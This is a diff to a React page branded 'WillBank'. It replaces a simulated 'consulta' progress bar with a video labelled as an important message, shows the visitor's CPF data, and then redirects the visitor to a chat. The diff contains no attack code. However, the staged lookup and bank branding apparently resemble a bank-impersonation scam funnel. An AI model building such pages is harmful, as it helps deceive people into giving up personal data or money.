@@ -1,6 +1,6 @@
-import { useEffect, useState } from "react";
+import { useEffect, useState, useRef } from "react";
 import { useNavigate, useLocation } from "react-router-dom";
-import { CreditCard, User, Calendar, Users, Search, Volume2 } from "lucide-react";
+import { CreditCard, User, Calendar, Users, Search, Play, Pause } from "lucide-react";
 import WillBankHeader from "@/components/WillBankHeader";
 import WillBankCard from "@/components/WillBankCard";
 import WillBankFooter from "@/components/WillBankFooter";
@@ -10,8 +10,10 @@ import { Progress } from "@/components/ui/progress";
 const Video = () => {
   const navigate = useNavigate();
   const location = useLocation();
-  const [progress, setProgress] = useState(0);
-  const [showConsulta, setShowConsulta] = useState(false);
+  const videoRef = useRef<HTMLVideoElement>(null);
+  const [isPlaying, setIsPlaying] = useState(false);
+  const [videoProgress, setVideoProgress] = useState(0);
+  const [videoEnded, setVideoEnded] = useState(false);
 
   const cpfData: CPFData | undefined = location.state?.cpfData;
 
@@ -20,25 +22,35 @@ const Video = () => {
       navigate("/");
       return;
     }
-
-    // Simular progresso de loading
-    const interval = setInterval(() => {
-      setProgress(prev => {
-        if (prev >= 100) {
-          clearInterval(interval);
-          setShowConsulta(true);
-          // Após mostrar consulta, navegar para chat
-          setTimeout(() => {
-            navigate("/chat", { state: { cpfData } });
-          }, 3000);
-          return 100;
-        }
-        return prev + 1;
-      });
-    }, 50);
-
-    return () => clearInterval(interval);
   }, [cpfData, navigate]);
+
+  const handleVideoClick = () => {
+    if (videoRef.current) {
+      if (isPlaying) {
+        videoRef.current.pause();
+        setIsPlaying(false);
+      } else {
+        videoRef.current.play();
+        setIsPlaying(true);
+      }
+    }
+  };
+
+  const handleTimeUpdate = () => {
+    if (videoRef.current) {
+      const progress = (videoRef.current.currentTime / videoRef.current.duration) * 100;
+      setVideoProgress(progress);
+    }
+  };
+
+  const handleVideoEnd = () => {
+    setIsPlaying(false);
+    setVideoEnded(true);
+    // Navegar para o chat após o vídeo terminar
+    setTimeout(() => {
+      navigate("/chat", { state: { cpfData } });
+    }, 1500);
+  };
 
   if (!cpfData) return null;
 
@@ -57,39 +69,65 @@ const Video = () => {
         <WillBankCard className="w-full max-w-2xl">
           <div className="space-y-4 sm:space-y-6">
             {/* Progress bar at top */}
-            <Progress value={progress} className="h-1.5 sm:h-2" />
+            <Progress value={videoProgress} className="h-1.5 sm:h-2" />
 
-            {/* Video Placeholder */}
-            <div className="relative aspect-video bg-gradient-to-br from-slate-900 via-slate-800 to-slate-900 rounded-xl sm:rounded-2xl overflow-hidden shadow-xl">
-              {/* Fake video content */}
-              <div className="absolute inset-0 flex items-center justify-center">
-                <div className="text-center">
-                  <div className="w-28 h-28 sm:w-40 sm:h-40 mx-auto bg-gradient-to-br from-primary to-amber-400 rounded-2xl flex items-center justify-center shadow-2xl">
-                    <span className="text-4xl sm:text-5xl">👩‍💼</span>
+            {/* Video Player */}
+            <div className="relative aspect-video bg-black rounded-xl sm:rounded-2xl overflow-hidden shadow-xl">
+              <video
+                ref={videoRef}
+                src="/video/video_consulta.mp4"
+                className="absolute inset-0 w-full h-full object-cover"
+                playsInline
+                onTimeUpdate={handleTimeUpdate}
+                onEnded={handleVideoEnd}
+                onClick={handleVideoClick}
+              />
+              
+              {/* Play/Pause Overlay */}
+              {!isPlaying && !videoEnded && (
+                <div 
+                  className="absolute inset-0 flex items-center justify-center bg-black/40 cursor-pointer"
+                  onClick={handleVideoClick}
+                >
+                  <div className="w-16 h-16 sm:w-20 sm:h-20 bg-primary rounded-full flex items-center justify-center shadow-2xl hover:scale-110 transition-transform">
+                    <Play className="w-8 h-8 sm:w-10 sm:h-10 text-primary-foreground ml-1" fill="currentColor" />
+                  </div>
+                  <div className="absolute bottom-4 left-4 right-4 text-center">
+                    <p className="text-white text-xs sm:text-sm font-medium bg-black/50 backdrop-blur-sm rounded-full px-4 py-2">
+                      👆 Toque para assistir a mensagem importante
+                    </p>
                   </div>
                 </div>
-              </div>
-              
-              {/* Audio Button Overlay */}
-              <button className="absolute top-1/2 left-1/2 -translate-x-1/2 -translate-y-1/2 bg-primary text-primary-foreground px-5 py-3 sm:px-8 sm:py-4 rounded-full flex items-center gap-2 sm:gap-3 font-bold text-sm sm:text-base shadow-2xl hover:bg-primary/90 hover:scale-105 transition-all duration-300">
-                <Volume2 className="w-5 h-5 sm:w-6 sm:h-6" />
-                Clique para ouvir
-              </button>
+              )}
 
-              {/* Video controls */}
-              <div className="absolute top-2 right-2 sm:top-4 sm:right-4 flex gap-1.5 sm:gap-2">
-                <button className="bg-black/60 backdrop-blur-sm text-white px-2 py-1 sm:px-3 sm:py-1.5 rounded-lg text-[10px] sm:text-xs font-medium hover:bg-black/80 transition-colors">
-                  📋 Desanexar
-                </button>
-                <button className="bg-black/60 backdrop-blur-sm text-white px-2 py-1 sm:px-3 sm:py-1.5 rounded-lg text-[10px] sm:text-xs font-medium hover:bg-black/80 transition-colors">
-                  ⏭️ RGX
-                </button>
-              </div>
+              {/* Video Ended Overlay */}
+              {videoEnded && (
+                <div className="absolute inset-0 flex items-center justify-center bg-black/60">
+                  <div className="text-center text-white">
+                    <div className="w-16 h-16 mx-auto bg-green-500 rounded-full flex items-center justify-center mb-3">
+                      <Search className="w-8 h-8 animate-pulse" />
+                    </div>
+                    <p className="font-bold text-base sm:text-lg">Finalizando consulta...</p>
+                    <p className="text-sm opacity-80">Aguarde um momento</p>
+                  </div>
+                </div>
+              )}
+
+              {/* Pause indicator */}
+              {isPlaying && (
+                <div 
+                  className="absolute inset-0 cursor-pointer"
+                  onClick={handleVideoClick}
+                >
+                  <div className="absolute bottom-3 right-3 bg-black/60 backdrop-blur-sm rounded-full p-2 opacity-0 hover:opacity-100 transition-opacity">
+                    <Pause className="w-5 h-5 text-white" />
+                  </div>
+                </div>
+              )}
             </div>
 
             {/* User Data Card */}
             <div className="border-2 border-primary/40 rounded-xl sm:rounded-2xl overflow-hidden shadow-sm">
-              {/* Yellow top border already from Card */}
               <div className="divide-y divide-border/40">
                 {dataFields.map((field, index) => {
                   const Icon = field.icon;
@@ -106,10 +144,10 @@ const Video = () => {
                 {/* Consulta Status */}
                 <div className="flex items-center gap-3 p-3 sm:p-4 bg-primary/5">
                   <div className="w-9 h-9 sm:w-11 sm:h-11 bg-primary/20 rounded-lg sm:rounded-xl flex items-center justify-center">
-                    <Search className={`w-4 h-4 sm:w-5 sm:h-5 text-primary ${!showConsulta ? 'animate-pulse' : ''}`} />
+                    <Search className={`w-4 h-4 sm:w-5 sm:h-5 text-primary ${!videoEnded ? 'animate-pulse' : ''}`} />
                   </div>
-                  <span className={`font-medium text-sm sm:text-base ${showConsulta ? 'text-success' : 'text-muted-foreground'}`}>
-                    {showConsulta ? "✓ Consulta finalizada!" : "Sua consulta está em andamento..."}
+                  <span className={`font-medium text-sm sm:text-base ${videoEnded ? 'text-success' : 'text-muted-foreground'}`}>
+                    {videoEnded ? "✓ Consulta finalizada!" : "Assista o vídeo para continuar..."}
                   </span>
                 </div>
               </div>
